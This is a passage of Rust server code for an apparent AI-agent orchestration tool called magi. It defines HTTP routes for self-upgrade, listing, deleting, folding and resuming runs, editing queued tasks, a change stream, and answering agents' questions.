                detail: format!(
                    "Automatic updates are disabled by {}. Nothing was parked \
                     and nothing restarted.",
                    crate::updater::NO_AUTOUPDATE_ENV
                ),
            }),
        ));
    }

    // Asked before anything is disturbed. Restarting when there is nothing
    // to install is not a harmless no-op: it parks the run in flight and
    // drops every connection to pay for an upgrade that did not happen. A
    // probe against a deck already on the newest build did exactly that.
    let (cfg, _) = Config::discover(&ui.repo, None).unwrap_or_default();
    let from = env!("CARGO_PKG_VERSION").to_owned();
    let latest = match crate::updater::Checker::new(&cfg.update) {
        Some(checker) => checker
            .newer_release()
            .await
            .map_err(|e| ApiError::internal(format!("check for a release: {e:#}")))?,
        None => None,
    };
    let Some(latest) = latest else {
        return Ok((
            StatusCode::OK,
            Json(UpgradeView {
                from,
                to: None,
                parked: None,
                detail: "Already on the newest release. Nothing was parked \
                         and nothing restarted."
                    .to_owned(),
            }),
        ));
    };

    // Parked before anything is replaced: a successor that came up while a
    // run was mid-node would find a run nobody is driving.
    let parked = ui.park_for_upgrade()?;
    let detail = match &parked {
        // Honest about the wait. A park takes effect at the *next* node
        // boundary, so a run mid-implement finishes that wave first - up to
        // `timeout_implement`, an hour by default. Saying "restarting now"
        // would make the deck look wedged for the rest of it.
        Some(run) => format!(
            "Run {} is parking at its next step, which can take as long as \
             the step it is on - up to an hour for an implement wave. The \
             deck replaces itself once it parks, comes back, and the loop \
             carries that run on from where it stopped. Nothing is lost if \
             you close this.",
            crate::run::short_of(run)
        ),
        None => "The deck replaces itself and comes back. Nothing was in \
                 flight to park."
            .to_owned(),
    };

    // Recorded before the spawn, not inside it: the phone's next `/api/health`
    // poll must see a `Downloading` stage immediately, not whenever the
    // spawned task happens to get scheduled.
    let mut progress = updater::Progress::new(from.clone(), latest.tag_name.clone());
    progress.parked_run = parked.clone();
    let _ = updater::write_progress(&ui.home, &progress);

    let home = ui.home.clone();
    tokio::spawn(async move {
        if let Err(e) = upgrade_and_restart(home.clone()).await {
            tracing::error!("the upgrade did not complete: {e:#}");
            if let Some(mut progress) = updater::read_progress(&home) {
                progress.fail(format!("{e:#}"));
                let _ = updater::write_progress(&home, &progress);
            }
        }
    });

    Ok((
        StatusCode::ACCEPTED,
        Json(UpgradeView {
            from,
            to: Some(latest.tag_name),
            parked,
            detail,
        }),
    ))
}

/// Replace the binary, then ask [`serve`] to hand the address over.
///
/// Separated from the handler so the 202 is already on its way, and separated
/// from the spawn so the successor starts only after the listener is dropped.
async fn upgrade_and_restart(home: PathBuf) -> Result<()> {
    // `yes` and non-interactive: nobody is at a terminal, and a prompt would
    // hang the upgrade for as long as the process lives.
    crate::updater::run_self_update(true, false, true).await?;
    tracing::info!("binary replaced - asking the server to hand over");
    if let Some(mut progress) = updater::read_progress(&home) {
        progress.advance(updater::Stage::Replaced);
        let _ = updater::write_progress(&home, &progress);
    }
    HANDOVER.notify_one();
    Ok(())
}

/// One row in the run list.
///
/// The list route returns this rather than whole `RunState`s: the summary of a
/// run is a few hundred bytes and the state is megabytes, and the difference
/// is what makes the history usable on a mobile link.
#[derive(Debug, Serialize)]
struct RunSummary {
    id: String,
    short: String,
    status: String,
    done: bool,
    instruction: String,
    title: String,
    repo: String,
    repo_name: String,
    created_at: String,
    updated_at: String,
    candidates: usize,
    viable: usize,
    judges: usize,
    winner: Option<char>,
    reviews: usize,
    quota_losses: usize,
    event: Option<String>,
    /// The later attempt at the same task that replaced this one, if any.
    ///
    /// Two cards with one title is otherwise unreadable: this is what lets
    /// the deck say "superseded by 4043" on the older of the pair.
    superseded_by: Option<String>,
    /// Blocked on a question nobody has answered.
    ///
    /// Derived from the question store rather than stored on the run: an agent
    /// calling `magi ask` blocks mid-node, and writing a status from there
    /// would race the graph's own save of `run.json` and be overwritten at the
    /// next node boundary. Asking the store is always true and never races.
    waiting: bool,
    /// The land loop's last look at the pull request, when there is one.
    pr: Option<crate::run::PrRecord>,
}

impl RunSummary {
    fn of(state: &RunState, waiting: bool) -> Self {
        Self {
            id: state.id.clone(),
            short: state.short().to_owned(),
            status: status_word(state.status),
            done: state.status.done(),
            instruction: state.instruction.clone(),
            title: title_from(&state.instruction, TITLE_MAX),
            repo: state.repo.display().to_string(),
            repo_name: state
                .repo
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            created_at: state.created_at.to_string(),
            updated_at: state.updated_at.to_string(),
            candidates: state.candidates.len(),
            viable: state.viable().len(),
            judges: state.config.graph.judges,
            winner: state.winner().map(|c| c.label),
            reviews: state.reviews.len(),
            quota_losses: state.quota.len(),
            event: state.events.last().map(|e| e.message.clone()),
            waiting,
            // Filled in by the list route, which is the only place that can
            // see a task's other attempts.
            superseded_by: None,
            pr: state.pr.clone(),
        }
    }
}

/// `RunStatus` as the wire spells it. Every variant is one word, so this is
/// the same string `serde` writes for the status inside a full run.
fn status_word(status: RunStatus) -> String {
    // `RunStatus::as_str` rather than lowercasing the `Debug` spelling: this
    // was a third way of naming the same statuses, and one that changed
    // silently with a derive.
    status.as_str().to_owned()
}

/// `?limit=`, clamped by the handler.
#[derive(Debug, Deserialize)]
struct ListQuery {
    #[serde(default)]
    limit: Option<usize>,
}

async fn runs_list(
    State(ui): State<Arc<Ui>>,
    Query(q): Query<ListQuery>,
) -> ApiResult<Json<Vec<RunSummary>>> {
    let limit = q.limit.unwrap_or(LIST_DEFAULT).min(LIST_MAX);
    blocking(move || {
        let superseded = superseded_runs(&ui.queue);
        let summaries = run_ids(&ui.runs)
            .into_iter()
            // A run whose state cannot be read is skipped, not fatal: a run
            // killed mid-write must not blank the history of every other one.
            // The detail route still explains it, which is where an operator
            // asking "what happened to that run" ends up.
            .filter_map(|id| read_run(&ui.runs, &id).ok())
            .take(limit)
            .map(|state| {
                let waiting = !ui.questions.open_for(&state.id).is_empty();
                let by = superseded.get(&state.id).cloned();
                let mut row = RunSummary::of(&state, waiting);
                row.superseded_by = by.as_deref().map(crate::run::short_of).map(str::to_owned);
                row
            })
            .collect();
        Ok(Json(summaries))
    })
    .await
}

/// Runs that a later attempt at the same task replaced, mapped to the id of
/// the attempt that replaced them.
///
/// A task keeps its attempts in order, and the deck showed them as two cards
/// with the same title and no hint which was which: yukimemi asked why
/// `stalled` and `blocked` appeared twice for one task, and the answer -
/// "those are two tries, and the second one exists because of a bug since
/// fixed" - was not on the screen anywhere.
///
/// Read from the queue rather than stored on the run, because the ordering is
/// the queue's fact: a `RunState` has no idea another attempt happened after
/// it.
fn superseded_runs(queue: &Queue) -> HashMap<String, String> {
    let mut by = HashMap::new();
    for task in queue.list() {
        for pair in task.runs.windows(2) {
            if let [earlier, later] = pair {
                by.insert(earlier.clone(), later.clone());
            }
        }
    }
    by
}

/// A run as the detail route hands it to the phone.
///
/// The whole state, flattened, plus `instruction_md`: the Task panel renders
/// the instruction as markdown, and the raw `instruction` field this struct
/// still carries (unchanged) is what a client wanting the exact bytes reads
/// instead.
#[derive(Debug, Serialize)]
struct RunDetailView {
    #[serde(flatten)]
    state: RunState,
    instruction_md: Vec<md::Node>,
    /// Whether a live daemon currently claims this run.
    ///
    /// `state.active` (flattened in above) is only ever cleared by the
    /// process that populated it; a killed one leaves its last wave's
    /// entries behind. Carrying this alongside is what lets the phone rail
    /// tell "this seat is still answering" from "this seat was still
    /// answering when whatever was driving this run died" without a second
    /// route — see `ActiveSeat`'s own docs for why the entry alone is not
    /// proof of either.
    live: bool,
}

impl RunDetailView {
    fn of(state: RunState, live: bool) -> Self {
        Self {
            instruction_md: md::to_nodes(&state.instruction, &md::ImageBase::None),
            live,
            state,
        }
    }
}

async fn run_detail(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<RunDetailView>> {
    blocking(move || {
        let id = resolve_run(&ui.runs, &id)?;
        let state = read_run(&ui.runs, &id)?;
        let live = crate::daemon::is_working_on(&ui.home, &id, jiff::Timestamp::now());
        Ok(Json(RunDetailView::of(state, live)))
    })
    .await
}

/// `DELETE /api/runs/{id}`.
///
/// Remove a finished, folded run directory along with its artifacts.
/// Running runs and runs with unfolded candidate worktrees/branches cannot be
/// deleted. This never touches git worktrees or branches - except for a run
/// whose state this build cannot read at all, where there is no candidate
/// list to check and the wholesale removal `magi fold` already uses for that
/// case is the only meaningful "delete".
async fn run_delete(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<StatusCode> {
    let (id, unreadable) = {
        let ui = Arc::clone(&ui);
        blocking(move || {
            let id = resolve_run(&ui.runs, &id)?;
            match read_run(&ui.runs, &id) {
                Ok(state) => {
                    let in_flight =
                        crate::daemon::is_working_on(&ui.home, &id, jiff::Timestamp::now());
                    state
                        .ensure_can_delete(in_flight)
                        .map_err(|e| ApiError::conflict(format!("{e:#}")))?;
                    let dir = ui.runs.join(&id);
                    std::fs::remove_dir_all(&dir)
                        .with_context(|| format!("remove run directory {}", dir.display()))?;
                    Ok((id, false))
                }
                Err(_) => {
                    // Unreadable: there is no candidate list to guard on, so
                    // a live daemon's claim is the only thing left to check -
                    // the same rule `run_fold` applies for the same reason.
                    if crate::daemon::is_working_on(&ui.home, &id, jiff::Timestamp::now()) {
                        return Err(ApiError::conflict(format!(
                            "run {id} is being worked on by a live daemon right now"
                        )));
                    }
                    Ok((id, true))
                }
            }
        })
        .await?
    };
    if unreadable {
        crate::clean::fold_unreadable(&ui.runs, &ui.worktrees_root, &id)
            .await
            .map_err(|e| ApiError::internal(format!("{e:#}")))?;
    }
    let ui = Arc::clone(&ui);
    let done = id.clone();
    blocking(move || {
        // The agent that asked died with the run, so an open question would
        // keep asking the operator for a decision nobody can deliver.
        ui.questions.abandon_for_run(
            &done,
            &format!("run {done} was deleted, so nothing is waiting for this answer"),
        )?;
        Ok(())
    })
    .await?;
    Ok(StatusCode::NO_CONTENT)
}

/// `POST /api/runs/{id}/fold`.
///
/// Remove a run's candidate worktrees and branches, keeping its record.
///
/// This exists because the deck answered "delete this run" with *"Candidates
/// must be folded before deleting. Run `magi fold` first."* — a phone being
/// told to open a terminal, in the one product whose point is that it does
/// not need one. The runs an operator most wants gone are the stalled and
/// blocked ones, and those are exactly the runs still holding worktrees:
/// three of them here held 53 GB.
///
/// The winner's tree goes too. A fold is what someone asks for when they are
/// finished with a run, and leaving one tree behind would leave the delete
/// button disabled for the same reason as before.
///
/// Refused while a live daemon is working on the run, on the rule that guards
/// deletion: folding underneath a running agent would pull the tree it is
/// editing out from under it.
///
/// A run whose state this build cannot read at all falls back to
/// [`crate::clean::fold_unreadable`] - there is no candidate list to fold
/// selectively, so the whole record's worktree goes wholesale, exactly what
/// `magi fold` does on the command line for the same run.
async fn run_fold(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Json<FoldView>> {
    let (id, state) = {
        let ui = Arc::clone(&ui);
        blocking(move || {
            let id = resolve_run(&ui.runs, &id)?;
            if crate::daemon::is_working_on(&ui.home, &id, jiff::Timestamp::now()) {
                return Err(ApiError::conflict(format!(
                    "run {id} is being worked on by a live daemon right now"
                )));
            }
            let state = read_run(&ui.runs, &id).ok();
            Ok((id, state))
        })
        .await?
    };
    let removed = match state {
        Some(mut state) => crate::graph::fold_run(&mut state, true)
            .await
            .map_err(|e| ApiError::internal(format!("{e:#}")))?,
        None => crate::clean::fold_unreadable(&ui.runs, &ui.worktrees_root, &id)
            .await
            .map_err(|e| ApiError::internal(format!("{e:#}")))?,
    };
    Ok(Json(FoldView {
        run: id,
        removed_count: removed.len(),
        removed,
    }))
}

/// What a fold took away, so the deck can say so rather than only re-render.
#[derive(Debug, Serialize)]
struct FoldView {
    run: String,
    /// Worktree paths and branch names removed, in the order they went.
    removed: Vec<String>,
    removed_count: usize,
}

/// `POST /api/runs/{id}/resume`.
///
/// Carry a stalled run on from where it stopped, in the background.
///
/// A stalled card says "the work is kept" and used to offer no way to act on
/// that: the candidates are built and paid for, and continuing means re-asking
/// only the seats whose absence collapsed the panel. The alternative an
/// operator actually had was releasing the task, which competes three fresh
/// implementations against work that already exists.
///
/// **202, not 200.** A resume runs agents for minutes; holding the connection
/// is the mistake `POST /api/talks/{id}/say` already made and had fixed. The
/// phone learns the outcome from the change stream.
///
/// Refused when the loop is running at all, not merely when it is on this run.
/// The scarce resource is the agent CLIs' quota, and a tap that quietly
/// started a second graph on top of whatever the loop is already driving —
/// one run by default, or as many as `Config::daemon.max_concurrent_runs`
/// allows — would spend that quota twice over for no extra throughput.
async fn run_resume(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<(StatusCode, Json<RunSummary>)> {
    let (id, state) = {
        let ui = Arc::clone(&ui);
        blocking(move || {
            let id = resolve_run(&ui.runs, &id)?;
            let state = read_run(&ui.runs, &id)?;
            Ok((id, state))
        })
        .await?
    };
    if !state.status.resumable() {
        return Err(ApiError::conflict(format!(
            "run {} is `{}`, and only a stalled or blocked run can be resumed",
            state.short(),
            status_word(state.status)
        )));
    }
    // Refused whenever the loop is running anything at all, not merely when
    // it is on this run: a manual resume racing a loop-driven run over the
    // same agent quota is the thing this guard exists to prevent, whether
    // the loop's own concurrency is one run or several.
    if let Some(work) = crate::daemon::current_work(&ui.home, jiff::Timestamp::now())
        .into_iter()
        .next()
    {
        return Err(ApiError::conflict(format!(
            "the loop is running run {} right now; stop it first, or wait for \
             it to finish, before resuming a run by hand.",
            crate::run::short_of(&work.run)
        )));
    }
    let _resume = ui.begin_resume(&id)?;

    // The same shape the list route returns, so the phone updates the card it
    // already has rather than learning a second schema for one button.
    let queued = RunSummary::of(&state, !ui.questions.open_for(&id).is_empty());
    let run = id.clone();
    tokio::spawn(async move {
        let _resume = _resume;
        match crate::graph::Runner::resume(&run) {
            Ok(mut runner) => {
                if let Err(e) = runner.execute().await {
                    tracing::warn!("resume of run {run} stopped: {e:#}");
                }
            }
            // The run's own record is what the phone reads; this line is for
            // the operator's terminal.
            Err(e) => tracing::warn!("run {run} could not be resumed: {e:#}"),
        }
    });
    Ok((StatusCode::ACCEPTED, Json(queued)))
}

async fn run_report(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<impl IntoResponse> {
    let text = blocking(move || {
        let id = resolve_run(&ui.runs, &id)?;
        // Colour is off for the whole process, set once in `serve`. Rendering
        // is CPU work over the full state, which is the other reason this is
        // not on the executor.
        let state = read_run(&ui.runs, &id)?;
        let live = crate::daemon::is_working_on(&ui.home, &id, jiff::Timestamp::now());
        Ok(format!(
            "{}{}",
            report::run(&state),
            report::active_seats(&state, live)
        ))
    })
    .await?;
    Ok(([(header::CONTENT_TYPE, "text/plain; charset=utf-8")], text))
}

/// A task as the UI sees it.
///
/// The whole task, plus the two things the client would otherwise have to
/// reimplement: the human-readable source and the status string. Nothing is
/// removed - the phone shows `last_error` and the run history verbatim.
#[derive(Debug, Serialize)]
struct TaskView {
    #[serde(flatten)]
    task: Task,
    source_label: String,
    status_str: &'static str,
    /// The instruction, parsed as markdown, for the Queue card's "Full
    /// instruction" panel. `task.instruction` is unchanged and still carries
    /// the raw text.
    instruction_md: Vec<md::Node>,
}

impl From<Task> for TaskView {
    fn from(task: Task) -> Self {
        Self {
            source_label: task.source.label(),
            status_str: task.status.as_str(),
            instruction_md: md::to_nodes(&task.instruction, &md::ImageBase::None),
            task,
        }
    }
}

/// `?refresh=1` forces a re-scan even inside the TTL. Any other value, or
/// its absence, leaves the cache to decide.
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct ReposQuery {
    refresh: u8,
}

/// `GET /api/repos` - local checkouts found under `[repos] roots`, the same
/// listing `magi repos` prints at a terminal.
///
/// Reads `[repos] roots` and `[repos] scan_ttl` discovered against `ui.repo`
/// so an edit to `magi.toml` takes effect without a restart, the same
/// reasoning [`config_for`] documents for the talk routes.
async fn repos_list(
    State(ui): State<Arc<Ui>>,
    Query(q): Query<ReposQuery>,
) -> ApiResult<Json<Vec<repos::Repo>>> {
    let refresh = q.refresh != 0;
    blocking(move || {
        let (cfg, _) = Config::discover(&ui.repo, None)?;
        Ok(Json(ui.repos_cache.list(
            &cfg.repos.roots,
            Duration::from_secs(cfg.repos.scan_ttl),
            refresh,
        )))
    })
    .await
}

async fn queue_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<TaskView>>> {
    blocking(move || {
        Ok(Json(
            ui.queue.list().into_iter().map(TaskView::from).collect(),
        ))
    })
    .await
}

/// The body of `POST /api/queue/{id}/hold`, sent empty when the operator
/// gives no reason - which must keep working, since not every hold has one.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct HoldBody {
    reason: Option<String>,
}

async fn queue_hold(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<HoldBody>, JsonRejection>,
) -> ApiResult<Json<TaskView>> {
    // An absent body is the ordinary case - most holds are unexplained, and
    // that has to stay a one-tap action rather than a form. A body that is
    // present and malformed is still a bad request.
    let body = match body {
        Ok(Json(body)) => body,
        Err(JsonRejection::MissingJsonContentType(_)) => HoldBody::default(),
        Err(e) => return Err(ApiError::bad_request(e.body_text())),
    };
    let reason = body.reason.filter(|r| !r.trim().is_empty());
    mutate(ui, id, move |t| {
        t.hold(reason.clone());
        Ok(())
    })
    .await
}

async fn queue_release(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TaskView>> {
    mutate(ui, id, |t| {
        t.release();
        Ok(())
    })
    .await
}

/// The body of `POST /api/queue/{id}/priority`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct PriorityBody {
    priority: i32,
}

/// `POST /api/queue/{id}/priority` - the up/down control on the Queue card.
///
/// [`Task::set_priority`] is the one place the "not while running" rule is
/// stated; this route only carries the body to it and lets its `Err` become
/// the 4xx the card shows.
async fn queue_priority(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<PriorityBody>, JsonRejection>,
) -> ApiResult<Json<TaskView>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    mutate(ui, id, move |t| t.set_priority(body.priority)).await
}

/// The body of `POST /api/queue/{id}/edit`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct EditBody {
    title: String,
    instruction: String,
}

/// `POST /api/queue/{id}/edit` - the full-text replacement the phone's edit
/// sheet sends. [`Task::edit`] refuses anything but `queued` and `held`, and
/// that refusal's message is what the sheet shows back.
async fn queue_edit(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<EditBody>, JsonRejection>,
) -> ApiResult<Json<TaskView>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    mutate(ui, id, move |t| {
        t.edit(body.title.clone(), body.instruction.clone())
    })
    .await
}

/// `POST /api/queue/{id}/done` - close a task as finished without deleting
/// it, so the phone's other way to clear a task from the backlog does not
/// have to cost the run history, the attribution, and `created_at` the way
/// [`queue_delete`] does. Behaves exactly like `magi task done`: any status
/// can be marked done by hand, because this is for the run the loop never
/// saw land - a merge done by hand, or a gate that misreported - and that can
/// happen from any status the task was left in.
async fn queue_done(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TaskView>> {
    mutate(ui, id, |t| {
        t.succeed();
        Ok(())
    })
    .await
}

/// `DELETE /api/queue/{id}`.
///
/// Remove a task from the backlog. Refused only while a live daemon's heartbeat
/// names this task: a `running` status or an orphaned `.lock` left behind by a
/// killed daemon is a leftover, and treating either as authority made the
/// task undeletable from the phone for good. The associated runs, if any, are
/// kept: a run is self-contained history and not an appendage of the task.
async fn queue_delete(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<StatusCode> {
    blocking(move || {
        let id = resolve_task(&ui.queue, &id)?;
        let in_flight = crate::daemon::is_working_on_task(&ui.home, &id, jiff::Timestamp::now());
        ui.queue
            .remove(&id, in_flight)
            .map_err(|e| ApiError::conflict(format!("{e:#}")))?;
        Ok(StatusCode::NO_CONTENT)
    })
    .await
}

/// Read a task, change it, write it back, under the queue's own lock.
///
/// Taking the same claim a daemon takes is what makes hold, release,
/// priority, edit, and done safe to press while magi is running: without it
/// the daemon's next save would land on top of the operator's change and
/// undo it. `change` can refuse - [`Task::set_priority`] and [`Task::edit`]
/// both do, for a running task - and that refusal becomes the 4xx the card
/// shows, same as any other domain rule.
async fn mutate(
    ui: Arc<Ui>,
    id: String,
    change: impl FnOnce(&mut Task) -> Result<()> + Send + 'static,
) -> ApiResult<Json<TaskView>> {
    blocking(move || {
        let id = resolve_task(&ui.queue, &id)?;
        // `claim` fails when the lock file already exists, which is the
        // conflict the UI must report: the daemon owns that task's file for
        // as long as it is running it, and our write would be lost under its
        // next save. The message names the lock either way.
        let _claim = ui.queue.claim(&id).map_err(|e| {
            ApiError::conflict(format!(
                "{e:#} - a daemon is running this task, so it cannot be \
                 changed from here yet"
            ))
        })?;
        let mut task = ui.queue.get(&id)?;
        change(&mut task).map_err(ApiError::bad_request_from)?;
        ui.queue.put(&mut task)?;
        Ok(Json(TaskView::from(task)))
    })
    .await
}

/// The change stream: one revision number per store, on connect and whenever
/// any of them moves.
///
/// The poll runs in one spawned task per client, which is affordable because
/// the work is a directory scan and a `stat` per file. It stops as soon as the
/// receiver is gone, so a phone that walks out of range costs nothing after
/// its next tick - there is no session and no cleanup to forget.
async fn events(State(ui): State<Arc<Ui>>) -> impl IntoResponse {
    let (tx, rx) = tokio::sync::mpsc::channel::<Event>(4);
    tokio::spawn(async move {
        let mut ticker = tokio::time::interval(POLL);
        let mut last: Option<(u64, u64, u64, u64, u64)> = None;
        loop {
            // The first tick completes immediately, which is what makes the
            // stream announce the current revisions on connect.
            ticker.tick().await;
            let state = Arc::clone(&ui);
            let revisions = tokio::task::spawn_blocking(move || {
                (
                    state.queue.revision(),
                    runs_revision(&state.runs),
                    state.questions.revision(),
                    state.talks.revision(),
                    // The loop's counter is in-process state rather than a
                    // file, so nothing the three stats above look at would
                    // tell this phone that another one started the loop.
                    state.lock_loop().rev,
                )
            })
            .await;
            let Ok(revisions) = revisions else { break };
            if last == Some(revisions) {
                continue;
            }
            last = Some(revisions);
            let payload = serde_json::json!({
                "queue_rev": revisions.0,
                "runs_rev": revisions.1,
                "questions_rev": revisions.2,
                "talks_rev": revisions.3,
                "loop_rev": revisions.4,
            });
            // Serializing five integers cannot fail; giving up beats looping.
            let Ok(event) = Event::default().event("change").json_data(payload) else {
                break;
            };
            if tx.send(event).await.is_err() {
                break;
            }
        }
    });
    Sse::new(ReceiverStream::new(rx).map(Ok::<Event, Infallible>))
        .keep_alive(KeepAlive::new().interval(KEEPALIVE))
}

/// Change detection token for recorded runs under `runs`.
///
/// Combines the id and `run.json` modification time of each run, so adding,
/// updating, or deleting any run — even an older one — moves the revision and
/// notifies connected clients via the change stream. Returns 0 when no runs
/// exist.
fn runs_revision(runs: &FsPath) -> u64 {
    use std::hash::{Hash as _, Hasher as _};

    let mut entries: Vec<(String, u64)> = std::fs::read_dir(runs)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let path = e.path().join("run.json");
            let mtime = path
                .metadata()
                .ok()?
                .modified()
                .ok()?
                .duration_since(std::time::UNIX_EPOCH)
                .ok()?
                .as_millis() as u64;
            let id = e.file_name().to_string_lossy().into_owned();
            Some((id, mtime))
        })
        .collect();

    if entries.is_empty() {
        return 0;
    }

    entries.sort_unstable();
    let mut hasher = std::hash::DefaultHasher::new();
    for (id, mtime) in &entries {
        id.hash(&mut hasher);
        mtime.hash(&mut hasher);
    }
    let h = hasher.finish();
    if h == 0 { 1 } else { h }
}

/// Run ids under `runs`, newest first.
///
/// Rooted at an explicit directory rather than calling [`run::list_ids`],
/// which reads the process-global home: the server has to be drivable against
/// a temp directory for any of this to be testable.
fn run_ids(runs: &FsPath) -> Vec<String> {
    let mut ids: Vec<String> = std::fs::read_dir(runs)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.path().join("run.json").is_file())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    // Ids start with a sortable timestamp.
    ids.sort_unstable_by(|a, b| b.cmp(a));
    ids
}

/// Read one run's state from an explicit runs root.
fn read_run(runs: &FsPath, id: &str) -> Result<RunState> {
    let path = runs.join(id).join("run.json");
    let body =
        std::fs::read_to_string(&path).with_context(|| format!("read {}", path.display()))?;
    let state: RunState =
        serde_json::from_str(&body).with_context(|| format!("parse {}", path.display()))?;
    if state.schema != run::SCHEMA {
        anyhow::bail!(
            "run {} was written by a different magi (schema {}, this build speaks {})",
            state.id,
            state.schema,
            run::SCHEMA
        );
    }
    Ok(state)
}

/// Runs on disk under `runs` whose state this build cannot parse - almost
/// always a schema bump, occasionally a run killed mid-write.
///
/// Exposed so every surface that reports on runs shares one count instead of
/// each re-deriving it: `/api/health` reports it as `runs_unreadable`, and
/// `magi doctor` calls this directly rather than guessing at the same number
/// a second way.
#[must_use]
pub fn runs_unreadable(runs: &FsPath) -> usize {
    run_ids(runs)
        .into_iter()
        .filter(|id| read_run(runs, id).is_err())
        .count()
}

/// Expand an id or short id to exactly one run id.
fn resolve_run(runs: &FsPath, id: &str) -> ApiResult<String> {
    if runs.join(id).join("run.json").is_file() {
        return Ok(id.to_owned());
    }
    pick(run_ids(runs), id, "run")
}

/// Expand an id or short id to exactly one task id.
fn resolve_task(queue: &Queue, id: &str) -> ApiResult<String> {
    if queue.path_of(id).is_file() {
        return Ok(id.to_owned());
    }
    pick(queue.list().into_iter().map(|t| t.id).collect(), id, "task")
}

/// A question as the phone reads it.
///
/// `detail`, the reasoning an agent wrote, is markdown; `detail_md` is that
/// text already parsed into a node tree so the client never runs its own
/// markdown reader over agent-authored prose. A relative image path in it
/// resolves against this question's own panel asset route, which is the one
/// place [`md::ImageBase::QuestionPanel`] is used - the panel iframe is a
/// separate, sandboxed document, but `detail` is rendered inline in the
/// operator's own page, so an image reference in it may only ever point at
/// files magi itself already serves for this question.
#[derive(Debug, Serialize)]
struct QuestionView {
    #[serde(flatten)]
    question: Question,
    detail_md: Vec<md::Node>,
    /// Is the ball in the agent's court right now?
    ///
    /// [`QuestionStatus`] stays `Open` for the whole of a round trip - see
    /// [`Question::say`] - so this is the one field that tells the phone to
    /// disable the answer controls and show "waiting for the agent" instead of
    /// a card the owner can act on. Computed rather than stored on
    /// [`Question`] itself, on the same reasoning as `waiting` on
    /// [`RunSummary`]: it is a read of `thread`'s own last entry, and keeping
    /// it here means the client never has to re-derive that rule.
    waiting_on_agent: bool,
}

impl From<Question> for QuestionView {
    fn from(question: Question) -> Self {
        let base = md::ImageBase::QuestionPanel {
            id: question.id.clone(),
        };
        Self {
            detail_md: md::to_nodes(&question.detail, &base),
            waiting_on_agent: question.waiting_on_agent(),
            question,
        }
    }
}

/// `GET /api/questions`.
///
/// Everything, not just the open ones: an answered question is the record of a
/// decision, and the phone is where the operator goes back to check what they
/// told an agent at 3am. `ask::Questions::list` already ranks open first.
async fn questions_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<QuestionView>>> {
    blocking(move || {
        Ok(Json(
            ui.questions
                .list()
                .into_iter()
                .map(QuestionView::from)
                .collect(),
        ))
    })
    .await
}

/// The body of `POST /api/questions/{id}/answer`.
///
/// Exactly one of the two fields, mirroring `ask::Answer`. Both or neither is
/// a bad request rather than a guess: an answer magi invented is worse than a
/// question left open.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct NewAnswer {
    choice: Option<String>,
    text: Option<String>,
}

async fn question_answer(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<NewAnswer>, axum::extract::rejection::JsonRejection>,
) -> ApiResult<Json<QuestionView>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    let answer = match (body.choice, body.text) {
        (Some(c), None) => Answer::Choice(c),
        (None, Some(t)) => Answer::Text(t),
        (Some(_), Some(_)) => {
            return Err(ApiError::bad_request(
                "send either `choice` or `text`, not both",
            ));
        }
        (None, None) => {
            return Err(ApiError::bad_request("send a `choice` or a `text`"));
        }
    };

    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let mut q = ui
            .questions
            .get(&id)
            .map_err(|e| ApiError::from(e).with_status(StatusCode::INTERNAL_SERVER_ERROR))?;
        if !q.status.open() {
            // Answered from the terminal, or by another phone, in between the
            // list and the tap. The UI shows the recorded answer rather than an
            // error, so it needs the record, not just the status.
            return Err(ApiError::conflict(format!(
                "question {} is already {}",
                q.short(),
                q.status.as_str()
            )));
        }
        // `Question::answer` owns the rules - an unoffered choice, free text on
        // a multiple-choice question, an empty reply - so the route does not
        // restate them and cannot drift from the CLI's behaviour.
        q.answer(answer).map_err(ApiError::bad_request_from)?;
        ui.questions.put(&mut q)?;
        Ok(Json(QuestionView::from(q)))
    })
    .await
}

/// The body of `POST /api/questions/{id}/say`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct NewSay {
    body: String,
}

/// `POST /api/questions/{id}/say` - the owner talks back without deciding.
///
/// Synchronous, unlike `POST /api/talks/{id}/say`: that route spawns an agent
/// CLI and waits on it, this one only appends a [`ask::Turn`] and writes the
/// file, so there is no turn to serialize against and no
/// [`Ui::begin_talk_turn`] guard to take. The agent waiting on this question
/// is a *different* process - the run parked behind `magi ask` - and picks
/// the reply up on its own poll of the very same file, same as an answer
/// does.
async fn question_say(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<NewSay>, JsonRejection>,
) -> ApiResult<Json<QuestionView>> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let mut q = ui
            .questions
            .get(&id)
